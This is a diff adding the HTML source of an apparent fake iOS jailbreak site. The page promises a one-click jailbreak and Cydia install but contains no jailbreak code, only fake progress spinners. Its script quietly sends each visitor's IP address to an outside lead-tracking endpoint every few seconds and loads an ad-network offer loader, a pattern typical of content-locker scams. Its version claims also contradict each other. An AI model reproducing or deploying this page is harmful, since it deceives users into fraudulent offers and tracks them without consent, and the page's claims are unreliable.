@@ -1,0 +1,150 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>iOS 11.4.X Jailbreak | Cydia for iPhone X,8+,8,7+,7,6S+,6S,6+,6,5s</title>
+	<meta name="description" content="325000+ Users! LAUNCHING iOS 11.4 Jailbreak Utility. Jailbreak any iDevice with our Latest Tool!" />
+	<meta name="keywords" content="iOS 11.4 Jailbreak,iOS 11.4 Cydia,iOS 10 Jailbreak,How to Jailbreak iOS 11.4,iPhone Jailbreak,iPhone 7 Jailbreak,iPad Jailbreak">
+    <meta name="author" content="">
+	<meta name="robots" content="noindex">
+
+    <!-- Bootstrap Core CSS -->
+    <link href="http://iosjbcrack.com/css/bootstrap.min.css" rel="stylesheet">
+
+    <!-- Default Core CSS -->
+    <link href="http://iosjbcrack.com/css/style.css" rel="stylesheet">    
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+</head>
+
+<body>
+
+	<div class="bottom-bar">
+		<span class="generator-msg">Waiting to start jailbreak</span>
+		<div class='loading spinner center'>
+			<div class='spinner-blade'></div>
+			<div class='spinner-blade'></div>
+			<div class='spinner-blade'></div>
+			<div class='spinner-blade'></div>
+			<div class='spinner-blade'></div>
+			<div class='spinner-blade'></div>
+			<div class='spinner-blade'></div>
+			<div class='spinner-blade'></div>
+			<div class='spinner-blade'></div>
+			<div class='spinner-blade'></div>
+			<div class='spinner-blade'></div>
+			<div class='spinner-blade'></div>
+		</div>
+	</div>
+
+    <!-- Page Content -->
+    <div class="container">
+
+
+	  	<div class="homePage">
+
+	       <div class="row">
+			    <div class="col-md-6 col-md-offset-3 text-center">
+<img width="75px" src="img/20181027053235.png">
+			    	<div class="logo">
+			    		<a href=""><img width="100px" src="img/20181028151037.png" /></a>
+			   	 	</div>
+			    	<p>Jailbreak for <span class="iOSVersion">12.0.1</span> Version.</p>
+		
+			    	<button type="button" class="btn btnGenerate btn-ios">Start Jailbreak</button>
+	
+			    <div class="generatorOffers">
+					<ul class="showOffers">
+						<li><center><a class="list-group-item list-group-item-action offer-li-txt">Installing LaBaStore 1.3-1 and Cydia</a></center></li>
+						<span class="offers-show">
+
+						</span>
+						<li>
+							<a class="list-group-item list-group-item-action offer-li-txt">
+								Waiting...
+								<div class='loading spinner center'>
+									<div class='spinner-blade'></div>
+									<div class='spinner-blade'></div>
+									<div class='spinner-blade'></div>
+									<div class='spinner-blade'></div>
+									<div class='spinner-blade'></div>
+									<div class='spinner-blade'></div>
+									<div class='spinner-blade'></div>
+									<div class='spinner-blade'></div>
+									<div class='spinner-blade'></div>
+									<div class='spinner-blade'></div>
+									<div class='spinner-blade'></div>
+									<div class='spinner-blade'></div>
+								</div>
+							</a>
+
+						</li>
+					</ul>	
+				</div>	
+
+				</div>
+			</div>
+	        <!-- /.row -->
+
+    	</div>
+    </div>
+    <!-- /.container -->
+
+    <!-- jQuery Version 1.11.1 -->
+    <script src="http://iosjbcrack.com/js/jquery.js"></script>
+
+    <!-- Bootstrap Core JavaScript -->
+    <script src="http://iosjbcrack.com/js/bootstrap.min.js"></script>
+
+    <script src="http://iosjbcrack.com/js/app.js"></script>    
+
+    <script type="text/javascript">
+	    $( document ).ready( function(){
+	        
+	        var protocol = window.location.protocol || document.location.protocol;
+
+	        $.get( protocol + "//ipinfo.io", function( response ) {
+	            
+	            ip_address = response.ip;
+	            
+	        }, "jsonp");
+
+	            
+	        check_lead = setInterval( function(){
+	            $.ajax({
+	                type: "POST",
+	                url: protocol + "//cpacodex.com/api/check_lead.php",
+	                data: { 'ip' : ip_address },
+	                success: function( data ) {
+	                    
+	                    if( data == 'true' ) {
+
+	                        window.location.replace( "redirect.html" );
+	                        clearInterval( check_lead );
+
+	                    }
+	                    
+	                }
+	            });
+	    	}, 3000);
+
+	    });
+    </script>
+	
+	<!-- OGAds Tracking -->
+	<script>var _webzone = "I19katEJv0Z91cJ";</script>
+	<script src="//loader.ogstats.com"></script>
+	
+</body>
+
+</html>
